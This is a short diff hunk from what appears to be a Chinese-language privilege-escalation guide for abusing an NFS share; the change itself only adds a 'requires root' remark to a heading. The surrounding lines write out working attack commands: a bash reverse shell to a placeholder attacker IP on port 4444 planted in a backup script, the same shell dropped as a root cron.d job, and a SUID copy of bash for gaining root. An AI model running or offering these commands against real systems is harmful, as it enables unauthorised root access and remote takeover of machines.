@@ -42,7 +42,7 @@ echo 'bash -i >& /dev/tcp/你的IP/4444 0>&1' > ./nfs/backup.sh
 # 或 3b. 往 cron.d 丢任务
 echo '* * * * * root bash -i >& /dev/tcp/你的IP/4444 0>&1' > ./nfs/mytask
 
-如果是普通目录
+如果是普通目录(需要root)
 # 4a. 造 SUID bash
 cp /bin/bash ./nfs/rootbash
 chmod u+s ./nfs/rootbash
